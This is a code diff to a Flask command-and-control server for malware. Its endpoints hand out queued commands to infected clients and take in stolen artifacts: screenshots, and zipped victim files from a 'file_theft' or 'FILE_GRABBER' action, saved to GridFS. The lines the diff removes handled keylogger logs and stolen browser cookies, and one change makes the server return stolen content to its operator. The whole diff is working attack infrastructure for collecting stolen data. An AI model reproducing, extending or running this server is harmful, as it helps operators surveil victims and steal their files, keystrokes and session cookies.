@@ -254,22 +254,20 @@ def send_command():
     if command_doc:
         #activity_id = command_doc.get('_id')
         command_data = command_doc.get('json')
-
-       # response = {
-       #     'activity_id': activity_id, #to match the artifact 
-       #     'command_data': command_data
-       # }
         return jsonify(command_data), 200
     else:
         return jsonify({'status': 'error', 'message': 'No commands in queue'}), 200
     
-#Get artifacts
 @app.route('/c2/send_artifact', methods=['POST'])
 def receive_artifact():
     data = request.json
     activity_id = data.get('activity_id')
     client_id = data.get('client_id')
-    last_activity = last_activity_collection.find_one({'_id': ObjectId(activity_id)})
+    
+    if not activity_id:
+        return jsonify({'status': 'error', 'message': 'Activity ID not provided'}), 400
+
+    last_activity = last_activity_collection.find_one({'_id': activity_id})
 
     if not last_activity:
         return jsonify({'status': 'error', 'message': 'Activity ID not found'}), 404
@@ -286,22 +284,20 @@ def receive_artifact():
         screenshot_base64 = data.get('screenshot')
         if screenshot_base64 is None:
             last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
+                {'_id': activity_id},
+                {'$set': {'status': 'failure'}}
+            )
             return jsonify({'status': 'error', 'message': 'The screenshot key is not found in the JSON file.'}), 400
         
-        # Get the latest screenshot file number
         try:
             existing_files = fs.find({'filename': {'$regex': f'^{action_type}_\\d+\\.png$'}})
             latest_number = max([int(re.search(r'_(\d+)\.png$', file.filename).group(1)) for file in existing_files], default=0)
             new_number = latest_number + 1
             file_name = f"{action_type}_{new_number}.png"
             
-            # Decode the base64 string
             screenshot_data = base64.b64decode(screenshot_base64)
-            # Save the screenshot to GridFS
             fs.put(io.BytesIO(screenshot_data), filename=file_name)
-            # Insert artifact data into the collection
+
             artifact_data = {
                 'client_id': client_id,
                 'activity_id': activity_id,
@@ -316,29 +312,50 @@ def receive_artifact():
         
         except Exception as e:
             last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
+                {'_id': activity_id},
+                {'$set': {'status': 'failure'}}
+            )
             return jsonify({'status': 'error', 'message': f'Failed to insert artifact into database: {str(e)}'}), 500
 
     elif action_type == 'file_theft':
-        zip_base64 = data.get('key')
-        if zip_base64 is None:
+        file_grabber_data = data.get('FILE_GRABBER')
+        
+        if not file_grabber_data:
             last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
-            return jsonify({'status': 'error', 'message': 'The zip_file key is not found in the JSON file.'}), 400
-        # Decode the base64 string
+                {'_id': activity_id},
+                {'$set': {'status': 'failure'}}
+            )
+            return jsonify({'status': 'error', 'message': 'FILE_GRABBER key not found in the JSON file.'}), 400
+
+        result = file_grabber_data.get('result')
+        error = file_grabber_data.get('error')
+        zip_base64 = file_grabber_data.get('data')
+
+        if result == 'failure':
+            last_activity_collection.update_one(
+                {'_id': activity_id},
+                {'$set': {'status': 'failure'}}
+            )
+            return jsonify({'status': 'error', 'message': f'File grabber failed with error: {error}'}), 400
+
+        if not zip_base64:
+            last_activity_collection.update_one(
+                {'_id': activity_id},
+                {'$set': {'status': 'failure'}}
+            )
+            return jsonify({'status': 'error', 'message': 'The zip_file data is empty.'}), 400
+
         try:
             zip_data = base64.b64decode(zip_base64)
-            # Open the zip file
             with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zip_file:
                 for file_info in zip_file.infolist():
-                    file_name = file_info.filename
-                    file_data = zip_file.read(file_info)  
-                    # Save the file to GridFS
-                    fs.put(io.BytesIO(file_data), filename=file_name)
+                    if file_info.is_dir() or file_info.filename.endswith('.zip'):
+                        continue  # Skip directories and ZIP files
                     
-                    # Insert artifact data into the collection
+                    file_name = file_info.filename
+                    file_data = zip_file.read(file_info)
+                    fs.put(io.BytesIO(file_data), filename=file_name)
+
                     artifact_data = {
                         'client_id': client_id,
                         'activity_id': activity_id,
@@ -350,86 +367,16 @@ def receive_artifact():
                     }
                     artifact_collection.insert_one(artifact_data)
                     responses.append({'file_name': file_name, 'status': 'saved'})
-        
+
         except Exception as e:
             last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
+                {'_id': activity_id},
+                {'$set': {'status': 'failure'}}
+            )
             return jsonify({'status': 'error', 'message': f'Failed to process zip file: {str(e)}'}), 500
 
-    elif action_type in ['keylogger', 'loader']:
-        log_base64 = data.get('log')
-        if log_base64 is None:
-            last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
-            return jsonify({'status': 'error', 'message': 'The log key is not found in the JSON file.'}), 400
-        
-        try:
-            # Decode the base64 string
-            log_data = base64.b64decode(log_base64)
-            
-            # Determine the file name and save the log to GridFS
-            existing_logs = fs.find({'filename': {'$regex': f'^{action_type}_\\d+\\.log$'}})
-            latest_number = max([int(re.search(r'_(\d+)\.log$', file.filename).group(1)) for file in existing_logs], default=0)
-            new_number = latest_number + 1
-            file_name = f"{action_type}_{new_number}.log"
-            
-            fs.put(io.BytesIO(log_data), filename=file_name)
-            
-            # Insert artifact data into the collection
-            artifact_data = {
-                'client_id': client_id,
-                'activity_id': activity_id,
-                'device': device_name,
-                'artifact_type': action_type,
-                'file_name': file_name,
-                'content': log_base64,
-                'created_at': datetime.now()
-            }
-            artifact_collection.insert_one(artifact_data)
-            responses.append({'file_name': file_name, 'status': 'saved'})
-        
-        except Exception as e:
-            last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
-            return jsonify({'status': 'error', 'message': f'Failed to process log file: {str(e)}'}), 500
-        
-    elif action_type == 'cookies':
-        cookie_base64 = data.get('cookie')
-        if cookie_base64 is None:
-            last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
-            return jsonify({'status': 'error', 'message': 'The cookie key is not found in the JSON file.'}), 400
-        
-        try:
-            cookie_data = base64.b64decode(cookie_base64)
-            file_name = f"cookies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-            
-            fs.put(io.BytesIO(cookie_data), filename=file_name)
-            
-            artifact_data = {
-                'client_id': client_id,
-                'activity_id': activity_id,
-                'device': device_name,
-                'artifact_type': action_type,
-                'file_name': file_name,
-                'content': cookie_base64,
-                'created_at': datetime.now()
-            }
-            artifact_collection.insert_one(artifact_data)
-            responses.append({'file_name': file_name, 'status': 'saved'})
-        
-        except Exception as e:
-            last_activity_collection.update_one(
-            {'_id': ObjectId(activity_id)},
-            {'$set': {'status': 'failure'}})
-            return jsonify({'status': 'error', 'message': f'Failed to process cookie file: {str(e)}'}), 500    
-    # Update the status of the last activity
     last_activity_collection.update_one(
-        {'_id': ObjectId(activity_id)},
+        {'_id': activity_id},
         {'$set': {'status': status_update}}
     )
 
@@ -622,7 +569,7 @@ def get_artifacts(device_name):
     artifact_collection = db[artifact_collection_name]
     
     try:
-        artifacts = list(artifact_collection.find({}, {'_id': 0, 'file_name': 1, 'artifact_type': 1, 'created_at': 1}))
+        artifacts = list(artifact_collection.find({}, {'_id': 0, 'file_name': 1, 'artifact_type': 1, 'created_at': 1, 'content': 1}))
         
         if artifacts:
             for artifact in artifacts:
